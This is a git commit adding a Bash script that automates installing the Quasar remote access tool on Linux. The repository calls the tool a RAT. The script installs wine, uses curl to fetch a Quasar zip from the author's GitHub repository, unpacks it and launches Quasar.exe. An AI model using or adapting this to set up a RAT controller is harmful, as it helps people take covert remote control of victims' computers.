e09e0b1f37ea1d6fcc3518ca5177b2882148dfc2
youhacker55 <57035255+youhacker55@users.noreply.github.com>
2022-11-11 01:44:13 +0800

    Create installQuasar.sh

---
+++ installQuasar.sh
@@ -0,0 +1,51 @@
+echo "Automation for installing Quasar in linux made by youhacker55"
+
+if (( $EUID != 0 )); then
+    echo "[-] Please run as root"
+    exit
+fi
+FILE=Quasar/Quasar.exe
+Firsttime=Firsttime.txt
+if [ -f "$Firsttime" ]; then
+         :
+else 
+    touch Firsttime.txt
+    apt-get  update
+    apt install curl
+    apt install unzip
+    apt install wine
+    apt install wine-mono
+    apt install winetricks
+fi
+
+
+
+if [ -f "$FILE" ]; then
+    echo "[+] Found Quasar.exe"
+else 
+    echo "Quasar.exe Not Found installing "
+    curl https://raw.githubusercontent.com/youhacker55/InstallQuasarRATInlinux/main/Quasar.v1.3.0.0.zip -o Quasar.zip
+    unzip Quasar.zip 
+    mv Quasar\ v1.3.0.0 Quasar 
+    
+   
+    
+fi
+
+echo """
+1) install .net 4.0
+2) run Quasar (always run option 1 before running Quasar)
+
+"""
+read option
+
+if [ "$option" -eq "1" ]; then
+        winetricks dotnet45
+
+elif [ "$option" -eq "2" ]; then
+        echo "[+] starting Quasar"
+        wine Quasar/Quasar.exe
+else
+   echo "[-] Invalid option"
+   
+fi
